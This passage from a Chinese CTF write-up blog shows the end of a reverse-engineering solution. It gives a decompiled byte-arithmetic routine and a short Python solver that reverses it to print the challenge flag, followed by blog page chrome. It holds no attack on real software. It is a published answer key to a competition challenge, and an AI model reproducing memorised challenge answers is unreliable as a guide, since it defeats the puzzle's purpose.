<span class="number">5</span>;</span><br><span class="line">  v1[<span class="number">33</span>] -= <span class="number">55</span>;</span><br><span class="line">  v1[<span class="number">35</span>] -= <span class="number">56</span>;</span><br><span class="line">  v1[<span class="number">10</span>] -= <span class="number">2</span>;</span><br><span class="line">  v1[<span class="number">26</span>] -= <span class="number">67</span>;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)v1[<span class="number">21</span>] - <span class="number">6</span>;</span><br><span class="line">  v1[<span class="number">21</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用python解出</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'canoecr7-zd9h-1emi-or8m-f8vm2od81nfk'</span></span><br><span class="line">v1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    v1.append(ord(i))</span><br><span class="line">v1[<span class="number">2</span>] -= <span class="number">13</span> </span><br><span class="line">v1[<span class="number">11</span>] -= <span class="number">5</span> </span><br><span class="line">v1[<span class="number">15</span>] -= <span class="number">44</span> </span><br><span class="line">v1[<span class="number">3</span>] -= <span class="number">11</span> </span><br><span class="line">v1[<span class="number">5</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">7</span>] += <span class="number">43</span> </span><br><span class="line">v1[<span class="number">28</span>] += <span class="number">50</span> </span><br><span class="line">v1[<span class="number">31</span>] += <span class="number">46</span> </span><br><span class="line">v1[<span class="number">19</span>] -= <span class="number">13</span> </span><br><span class="line">v1[<span class="number">20</span>] -= <span class="number">66</span> </span><br><span class="line">v1[<span class="number">1</span>] += <span class="number">3</span> </span><br><span class="line">v1[<span class="number">29</span>] -= <span class="number">55</span> </span><br><span class="line">v1[<span class="number">24</span>] -= <span class="number">51</span> </span><br><span class="line">v1[<span class="number">9</span>] -= <span class="number">23</span> </span><br><span class="line">v1[<span class="number">25</span>] -= <span class="number">6</span> </span><br><span class="line">v1[<span class="number">27</span>] -= <span class="number">60</span> </span><br><span class="line">v1[<span class="number">4</span>] -= <span class="number">52</span> </span><br><span class="line">v1[<span class="number">6</span>] -= <span class="number">14</span> </span><br><span class="line">v1[<span class="number">30</span>] -= <span class="number">52</span> </span><br><span class="line">v1[<span class="number">22</span>] -= <span class="number">58</span> </span><br><span class="line">v1[<span class="number">12</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">16</span>] -= <span class="number">56</span> </span><br><span class="line">v1[<span class="number">34</span>] -= <span class="number">53</span> </span><br><span class="line">v1[<span class="number">0</span>] -= <span class="number">48</span> </span><br><span class="line">v1[<span class="number">14</span>] += <span class="number">3</span> </span><br><span class="line">v1[<span class="number">17</span>] -= <span class="number">5</span> </span><br><span class="line">v1[<span class="number">33</span>] -= <span class="number">55</span> </span><br><span class="line">v1[<span class="number">35</span>] -= <span class="number">56</span> </span><br><span class="line">v1[<span class="number">10</span>] -= <span class="number">2</span> </span><br><span class="line">v1[<span class="number">26</span>] -= <span class="number">67</span></span><br><span class="line">result = (v1[<span class="number">21</span>]&amp;<span class="number">0xff</span>) - <span class="number">6</span></span><br><span class="line">v1[<span class="number">21</span>] = result</span><br><span class="line">print(<span class="string">'flag&#123;'</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v1:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">'&#125;'</span>)</span><br><span class="line"><span class="comment"># flag&#123;3dad13db-cb48-495d-b023-3231d80f1713&#125;</span></span><br></pre></td></tr></table></figure>

    </div>

    
    
    
        <div class="reward-container">
  <div>坚持原创技术分享,您的支持将鼓励我继续创作!</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="Jeff 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.jpg" alt="Jeff 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
              <a href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/" rel="tag"><i class="fa fa-tag"></i> 网鼎杯</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/05/26/GKCTF2020-Web-Misc/" rel="prev" title="GKCTF2020_Web&Misc">
      <i class="fa fa-chevron-left"></i> GKCTF2020_Web&Misc
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/05/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99todolist/" rel="next" title="从零开始编写todolist前后端">
      从零开始编写todolist前后端 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#青龙组"><span class="nav-text">青龙组</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AreUSerialz"><span class="nav-text">AreUSerialz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#notes"><span class="nav-text">notes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filejava"><span class="nav-text">filejava</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#虚幻2"><span class="nav-text">虚幻2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Teslaaaaa"><span class="nav-text">Teslaaaaa</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Jeff"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Jeff</p>
  <div class="site-description" itemprop="description">一个菜狗的辣鸡博客。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">34</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plZmZ6NjE1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jeffz615"><i class="fab fa-github fa-fw"></i></span>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2020 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">版权由 <a href="https://github.com/jeffz615" target="_blank" rel="noopener"><b>Jeff</b></a> 所有,转载请标明出处</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
